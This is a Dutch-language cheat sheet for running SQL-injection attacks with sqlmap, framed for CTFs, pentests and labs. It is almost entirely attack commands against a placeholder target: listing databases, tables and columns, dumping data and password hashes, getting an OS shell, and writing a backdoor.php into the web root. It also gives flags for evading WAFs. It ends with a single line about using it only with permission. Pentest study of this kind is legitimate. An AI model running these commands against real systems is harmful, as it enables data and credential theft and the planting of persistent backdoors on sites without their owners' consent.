
# SQLMap Cheat Sheet

Een handige referentie voor het uitvoeren van SQL-injectie aanvallen met sqlmap tijdens CTF's, pentests of labs.

## Basisgebruik

**Target:**
```
http://target.com/index.php?search=test
```

**Basic detectie:**
```bash
sqlmap -u "http://target.com/index.php?search=test" --batch
```

- `--batch`: Voert automatisch keuzes uit zonder prompts.
- Detecteert database type, technieken, enz.

## Database Informatie

### Toon beschikbare databases
```bash
sqlmap -u "http://target.com/index.php?search=test" --dbs
```

### Toon tabellen binnen een database
```bash
sqlmap -u "http://target.com/index.php?search=test" -D <database_naam> --tables
```

### Toon kolommen binnen een tabel
```bash
sqlmap -u "http://target.com/index.php?search=test" -D <database_naam> -T <tabel_naam> --columns
```

### Dump specifieke kolommen
```bash
sqlmap -u "http://target.com/index.php?search=test" -D <database> -T <tabel> -C <kolom1,kolom2> --dump
```

## Geavanceerde Technieken

### Kolomaantal detecteren (UNION)
```bash
sqlmap -u "http://target.com/index.php?search=test" --technique=U --union-cols=10
```

### Wachtwoorden dumpen (indien aanwezig)
```bash
sqlmap -u "http://target.com/index.php?search=test" --passwords
```

### OS-shell verkrijgen
```bash
sqlmap -u "http://target.com/index.php?search=test" --os-shell
```

## File Access

### Upload een bestand
```bash
sqlmap -u "http://target.com/index.php?search=test" --file-write=backdoor.php --file-dest=/var/www/html/backdoor.php
```

## Extra Opties

| Flag               | Betekenis                                      |
|--------------------|------------------------------------------------|
| --batch            | Geen interactie nodig                          |
| --random-agent     | Willekeurige User-Agent                        |
| --level=5          | Meer payloads testen                           |
| --risk=3           | Risicovollere technieken meepakken             |
| --threads=10       | Snelheid verhogen                              |
| --tamper=xxx.py    | Payloads aanpassen om WAF’s te omzeilen        |
| --cookie="..."     | Cookie meegeven bij login-verplichte targets   |

## Voorbeeld: alles in één

```bash
sqlmap -u "http://target.com/index.php?search=test" --dbs --level=5 --risk=3 --random-agent --batch
```

Gebruik dit alleen op doelwitten waarvoor je toestemming hebt (CTF, testlab, eigen omgeving).
